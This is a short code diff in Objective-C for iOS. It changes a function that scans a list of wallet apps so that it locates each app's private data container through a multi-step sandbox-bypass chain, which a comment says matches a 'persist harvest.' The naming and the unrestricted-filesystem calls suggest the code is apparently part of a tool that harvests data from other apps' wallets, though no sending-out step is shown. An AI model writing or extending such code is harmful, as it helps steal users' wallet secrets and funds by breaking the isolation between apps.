@@ -398,12 +398,9 @@ static NSArray<NSDictionary *> *DSWalletTargets(void)
 static void DSWalletScanOne(NSDictionary *wallet)
 {
     NSString *bundleID = wallet[@"bundleId"];
-    NSString *error = nil;
-    MCMFilzaSetUnrestrictedFilesystem(YES);
-    NSString *container = MCMFilzaDataContainerPath(bundleID, &error);
-    if (container.length == 0) {
-        container = MCMContainerPathForIdentifier(2, bundleID, NO, &error);
-    }
+    // Full resolution chain (MCM lease → activate → virtual root → virtual root
+    // search → metadata scan → LaunchServices), same as the persist harvest.
+    NSString *container = TryMaskCardResolveContainerPath(bundleID);
     if (container.length == 0) {
         DSLog(@"wallet %@: no container resolved", wallet[@"type"]);
         return;
